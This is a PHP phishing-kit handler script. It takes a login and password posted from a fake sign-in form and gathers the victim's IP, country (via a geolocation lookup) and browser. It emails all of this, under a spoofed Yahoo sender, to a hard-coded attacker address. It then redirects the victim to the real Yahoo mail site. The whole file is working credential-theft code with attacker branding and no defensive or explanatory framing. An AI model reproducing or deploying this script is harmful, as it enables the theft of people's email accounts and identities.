<?php
session_start();
$_SESSION['pdf1'] = $_POST['pdf1'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['q1_8'];
$passwd = $_POST['q2_8'];
$own = 'maxgomery@yandex.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'sagaresult@vodking.net';
$domain = 'RDP REPORT! ';
$subj = "$domain EX $country";
$headers .= "From: YAHOO!<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'nv.php?capacode=231101';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________MADEMEN CYBER TEAM_________</td></tr>
 <tr><td><STRONG>VODKING: $login<td/></tr>
 <tr><td><STRONG>VODPASS: $passwd</td></tr>
 <tr><td><STRONG>IP: $ip</td></tr>
 <tr><td><STRONG>Date: $server</td></tr>
 <tr><td><STRONG>country : $country</td></tr>
 <tr><td>Browser : $browserAgent</td></tr>
 <tr><td>____HACKED BY SAGE THE HURT ICE (SKYPE =PAYP ALGENT)____</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: phpnet.php?code=2000700 " );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: https://mail.yahoo.com");
}
?>
